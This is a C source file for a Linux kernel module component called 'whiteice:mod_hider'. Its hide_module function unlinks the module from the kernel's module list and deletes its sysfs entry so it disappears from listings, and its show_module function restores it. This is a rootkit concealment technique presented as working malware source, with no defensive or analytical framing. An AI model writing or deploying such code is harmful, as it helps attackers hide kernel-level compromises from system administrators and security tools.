#include "defs.h"
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>

extern struct list_head __this_module_list;
static short is_hidden = 0;
static struct list_head *prev_module;
static struct kobject *saved_kobj;

void hide_module(void) {
    if (is_hidden) return;

    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);

    saved_kobj = THIS_MODULE->mkobj.kobj.parent;
    kobject_del(&THIS_MODULE->mkobj.kobj);
    kobject_put(&THIS_MODULE->mkobj.kobj);

    is_hidden = 1;
    printk(KERN_INFO "[whiteice:mod_hider] Module hidden\n");
}

void show_module(void) {
    if (!is_hidden) return;

    list_add(&THIS_MODULE->list, prev_module);
    kobject_add(&THIS_MODULE->mkobj.kobj, saved_kobj, "whiteice");

    is_hidden = 0;
    printk(KERN_INFO "[whiteice:mod_hider] Module revealed\n");
}
